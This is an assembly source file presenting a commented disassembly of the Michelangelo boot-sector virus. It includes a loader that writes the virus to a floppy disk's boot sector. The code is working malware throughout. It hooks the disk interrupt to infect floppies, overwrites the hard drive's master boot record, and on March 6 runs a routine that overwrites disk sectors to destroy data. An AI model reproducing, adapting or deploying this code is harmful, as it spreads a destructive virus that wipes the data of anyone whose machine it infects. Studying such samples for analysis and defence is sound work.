;virus                                               date 12/31/93
;disassembly of 1 version of the MICHElANGLO VIRUS
;michelangelo with a loader that will put the virus
;on a disk in drive b: will work correctly on 360 or 1.2meg disks
;loads orginal boot at last sector on those type of disks
;warning if computer date is march 6 on boot up with virus it will
;try to infect hard drive then write system info on 
;to disks destroying the information on disk 
;
;
;to load virus onto A drive alter the equ disk_dr to 00

int13_IP       EQU     0004CH                  ;interrupt 13H location
int13_CS       EQU     0004EH


MICHA           SEGMENT BYTE
		ASSUME CS:MICHA, DS:MICHA, ES:MICHA, SS:MICHA

;*****************************************************************************
;loader program        
	disk_dr         equ     01            ;01 disk b 00 disk a
	
	ORG     100H

START:          MOV     DL,DISK_DR
		XOR     SI,SI

		XOR     AX,AX                       ; RESET DRIVE
		INT     13H
		INC     SI
AGAIN:
		MOV     AX,201H                     ;READ BOOT INTO BUFFER
		MOV     BX,OFFSET BUFF
		MOV     CX,01
		MOV     Dh,00
		mov     dl,disk_dr
		INT     13H
		JNC     ALRIGHT

		CMP     SI,4
		JA      ERROR_WRITE

		xor     ax,ax
		int     13h
		JMP     AGAIN
ALRIGHT:                
		MOV     AX,301H                    ; WRITE BOOT TO 
		MOV     Dh,01                      ; LAST SECTOR OF 
		MOV     CL,03                      ; DIR
		mov     dl,disk_dr                 ; WHICH DISK
		CMP     BYTE PTR [BX+15H],0FDH     ; TYPE OF DISK HIGH LOW
		JZ      LOW_DENSW                  ;
		
		MOV     CL,0EH

LOW_DENSW:               
		MOV     [LOC_ORG_BOOT],CX       ; SETUP VIRUS FOR TYPE
		INT     13H                     ; DISK DRIVE              

		XOR     AX,AX                   ; RESET DRIVE
		INT     13H
		
		MOV     AX,0301H                ;WRITE VIRUS
		MOV     BX,OFFSET M_START       ; TO BOOT SECTOR
		mov     cx,01
		mov     Dh,00
		mov     dl,disk_dr
		INT     13H
		JNC     FINI
		
ERROR_WRITE:    MOV     AH,9
		MOV     DX,OFFSET ERROR_MESS
		INT     21H


FINI:
		INT     20H                     ;EXIT

ERROR_MESS      DB      'SORRY THERE IS A PROBLEM CHECK DRIVE DOOR'
		DB      'OR TRY ANOTHER DISK',24H

BUFF            DB      200H    DUP (90)        ;BUFFER FOR R/W OF DISK

;*************************************************************************

		ORG     0413H
MEM_SIZE        DW      ?                       ;memory size in kilobytes

		ORG     043FH
MOTOR_STATUS    DB      ?                       ;floppy disk motor status


;*************************************************************************                 

		 ORG     7C00H
M_START:
		JMP     START1

JMP_HI_MEM      DW      OFFSET HI_MEM - 7C00H
HIGH_SEG        DW      0

DESTROY_CNT     DB      02

LOC_ORG_BOOT    DW      000EH                            ;HIGH DENS

OLD_INT13_IP    DW      0
OLD_INT13_CS    DW      0

VIR_INT13:
		PUSH    DS                              ; SAVE REGS
		PUSH    AX                              ;
		OR      DL,DL                           ;  IS IT DISK DRIVE A
		JNZ     BIOS_INT13                      ;  NO 

		XOR     AX,AX                           ;CHECK MOTOR STATUS
		MOV     DS,AX                           ; IS MOTOR RUNNING
		TEST    BYTE PTR DS:[MOTOR_STATUS],01   ;
		JNZ     BIOS_INT13                      ; YES 

		POP     AX                                    ; LET
		POP     DS                                    ; THE INT CALL
		PUSHF                                         ; GO BUT RETURN
		CALL    DWORD PTR CS:[OLD_INT13_IP - 7C00H]   ; TO THE VIRUS

		PUSHF                                         ; ON RETURN
		CALL    INFECT_FLOPPY                         ; ATTEMPT INFECT

		POPF                            ;ATTEMPTED INFECT RETURN
		RETF    2                       ;TO ORGINAL INT CALLER

BIOS_INT13:
		POP     AX                                   ;LET BIOS HANDLE
		POP     DS                                   ;THE CALL
		JMP     DWORD PTR CS:[OLD_INT13_IP - 7C00H]  ;

INFECT_FLOPPY:
		PUSH    AX BX CX DX DS ES SI DI
				 
		PUSH    CS
		POP     DS
		
		PUSH    CS
		POP     ES

		MOV     SI,04                   ;RETRY COUNTER

READ_LP:
		MOV     AX,201H                 ; SETUP TO READ BOOT SECTOR
		MOV     BX,0200H                ; TO END OF VIRUS
		MOV     CX,01                   ;
		XOR     DX,DX                   ;
		
		PUSHF                                     ;FAKE A INT 13 CALL
		CALL    DWORD PTR [OLD_INT13_IP - 7C00H]  ;
		JNB     NO_ERROR                          ;

TRY_AGAIN:                                                ; IF ERROR
		XOR     AX,AX                             ; RESET DRIVE
		PUSHF                                     ; AND TRY AGAIN FOR 
		CALL    DWORD PTR [OLD_INT13_IP - 7C00H]  ; COUNT OF 4   
		DEC     SI                                ; USING SI 
		JNZ     READ_LP                           ;
							  
		JMP     SHORT ERROR_EXIT            ;PROBALY WRITE PROTECT
						    ;GET OUT
NO_ERROR:
		XOR     SI,SI

CHK_FOR_INFECTION:
		CLD                              ; CHECK FIRST 2 BYTES
		LODSW                            ; TO VIRUS
		CMP     AX,[BX]                  ;
		JNZ     NOT_INFECTED_A           ; NOT MATCH GO INFECT
		LODSW                            ; TRY NEXT 2 BYTES
		CMP     AX,[BX+2]                ;
		JZ      ERROR_EXIT               ; MATCH LEAVE

NOT_INFECTED_A:                                         
		MOV     AX,301H                         ; WRITE THE ORGINAL
		MOV     DH,01                           ; BOOT TO THE NEW 
		MOV     CL,03                           ; LOCATION FIND
		CMP     BYTE PTR [BX+15H],0FDH          ; NEW LOCATION
		JZ      LOW_DENS                        ; BY CHECKING IF 360
									
		MOV     CL,0EH                          ; OR 1.2

LOW_DENS:               
		MOV     [LOC_ORG_BOOT - 7C00H],CX       ;SAVE NEW LOCATION

		PUSHF                                    ;  CALL TO 
		CALL    DWORD PTR [OLD_INT13_IP - 7C00H] ;  INT 13
		JB      ERROR_EXIT

UPDATE_END:                                              
		MOV     SI,3BEH                          ; COPY LAST
		MOV     DI,1BEH                          ; 21 BYTES FROM 
		MOV     CX,21H                           ; ORGINAL BOOT
		CLD                                      ; SECTOR
		REPZ    MOVSW                            ; TO VIRUS
							 
		MOV     AX,0301H                        ; WRITE VIRUS
		XOR     BX,BX                           ; TO BOOT SECTOR
		MOV     CX,01                           ; SECTOR 1
		XOR     DX,DX                           ; DRIVE A HEAD A

		PUSHF                                    ;INT 13
		CALL    DWORD PTR [OLD_INT13_IP - 7C00H] ;

ERROR_EXIT:
		POP     DI SI ES DS DX CX BX AX          ; RESTORE REGS
		RET                                      ; LEAVE

START1:
		XOR     AX,AX                           ;WHERE WE JUMP TO
		MOV     DS,AX                           ;AT BOOT UP TIME
		CLI                                     ;SET UP STACK
		MOV     SS,AX                           ;
		MOV     AX,7C00H                        ;
		MOV     SP,AX                           ;
		STI                                     ;

		PUSH    DS                              ; SET UP FOR RETF 
		PUSH    AX                              ; LATER

		MOV     AX,DS:[INT13_IP]                ;SAVE OLD INT 13 
		mov     [OLD_INT13_IP],AX               ;VECTORS

		MOV     AX,DS:[INT13_CS]                ;
		MOV     [OLD_INT13_CS],AX               ;

		MOV     AX,DS:[MEM_SIZE]                ;DEC MEMORY SIZE
		DEC     AX                              ;
		DEC     AX                              ;
		MOV     DS:[MEM_SIZE],AX                ;

		MOV     CL,06H                          ;CONVERT SIZE TO 
		SHL     AX,CL                           ;SEGMENT ADDRESS
		MOV     ES,AX                           ;
							
		MOV     [HIGH_SEG],AX                   ;SAVE ADDRESS

		MOV     AX, OFFSET VIR_INT13 - 7C00H    ; SET UP INT 13 TO 
		MOV     DS:[INT13_IP],AX                ; POINT TO US
		MOV     DS:[INT13_CS],ES                ;

		MOV     CX,1BEH             ;OFFSET END_VIR - OFFSET M_START
		MOV     SI,7C00H            ;COPY VIRAL CODE UP IN MEMORY
		XOR     DI,DI               ;
		CLD                         ;
		REPZ    MOVSB               ;

		JMP     DWORD PTR CS:[JMP_HI_MEM]       ;GO THERE

HI_MEM:
		XOR     AX,AX               ; RESET DRIVE
		MOV     ES,AX               ; SET UP ES SEGMENT TO 0
		INT     13H                 ;

		PUSH    CS                  ;DS POINTS HERE
		POP     DS                  ;

		MOV     AX,0201H                        ;READ ORGINAL BOOT
		MOV     BX,7C00H                        ;
		MOV     CX,[LOC_ORG_BOOT - 7C00H]       ;
		CMP     CX,0007H                        ;
		JNZ     FLOPPY

H_DRIVE:                                                
		MOV     DX,0080H                        ; READ ORGINAL
		INT     13H                             ; BOOT FROM HARD DRIVE
		JMP     SHORT GET_DATE                  ; CHECK DATE

FLOPPY:
		MOV     CX,[LOC_ORG_BOOT - 7C00H]       ;READ ORGINAL
		MOV     DX,100H                         ;BOOT FROM FLOPPY
		INT     13H                             ;
		JB      GET_DATE                        ; IF ERROR CHECK DATE

		PUSH    CS
		POP     ES

HD_INFECT:
		MOV     AX,0201H                        ;READ 1 SECTOR
		mov     bx,0200h                        ;TO BUFFER
		mov     cx,0001h                        ;SECTOR 1 
		MOV     DX,0080H                        ;HEAD 0 DISK C:
		INT     13H

		JB      GET_DATE                        ;IF ERROR

CHK_BOOT:
		XOR     SI,SI
		CLD
		LODSW
		CMP     AX,[BX]
		JNE     NOT_INFECTED
		LODSW
		CMP     AX,[BX+2]
		JNE     NOT_INFECTED

GET_DATE:
		XOR     CX,CX                           ;GET DATE
		MOV     AH,04                           ;
		INT     1AH                             ;
		CMP     DX,0306H                        ;IS IT MARCH 6
		JZ      TRASH_DISK                      ;
		RETF                                    ;BIOS_BOOT

;******************************************************************
; TRASH DISK ROUTTINE SIMPLY WRITE MEMORY DATA FROM
; 5000:5000  TO THE DISKS FIRST 9 SECTORS UNTIL AN ERROR HITS IT
;

TRASH_DISK:
		XOR     DX,DX
		MOV     CX,1
D_LOOP:         
		MOV     AX,0309H                        ;WRITE DISK 9 SECTORS
		MOV     SI,[LOC_ORG_BOOT - 7C00H]
		CMP     SI,+03
		JE      FLPPY_DISK

		MOV     AL,0EH
		CMP     SI,+0EH
		JE      FLPPY_DISK

		MOV     DL,80H
		MOV     BYTE PTR [DESTROY_CNT - 7C00H],04
		MOV     AL,11H
FLPPY_DISK:
		MOV     BX,5000H
		MOV     ES,BX
		INT     13H
		
		JNB     NO_ERROR_DESTROY

;RESET_DISK
		XOR     AH,AH
		INT     13H

NO_ERROR_DESTROY:
		INC     DH
		CMP     DH,[DESTROY_CNT - 7C00H]
		JB      D_LOOP

		XOR     DH,DH
		INC     CH
		JMP     SHORT D_LOOP

;*********************************************************************

NOT_INFECTED:
;HD                                                    ; INFECT HD
		MOV     CX,0007                        ; BY WRITING       
		MOV     [LOC_ORG_BOOT - 7C00H],CX      ; ORGINAL BOOT
		MOV     AX,0301H                       ; TO HEAD 0 SECTOR 7
		MOV     DX,0080H                       ; TRACK 0 
		INT     13H                            ;
		JB      GET_DATE                       ;

;UPDATE_PARTION:
		MOV     SI,03BEH                       ;IMPORTANT TO UPDATE
		MOV     DI,01BEH                       ;PARTION TABLE
		MOV     CX,21H                         ;
		REPZ    MOVSW                          ;

		MOV     AX,0301H                       ;NOW WRITE VIRUS 
		XOR     BX,BX                          ;TO HARD DRIVE
		INC     CL                             ;
		INT     13H
		JMP     SHORT GET_DATE
;THE REST IS WHERE THE PARTION TABLE INFO GOES OR END OF FLOPPY DISK        
;BOOT SECTOR GOES

	ORG     7DBEH
END_VIR:
	
	DB      00
	ORG     7DFEH
BOOT_ID         DB 55H,0AAH

micha   ENDS
	END     START


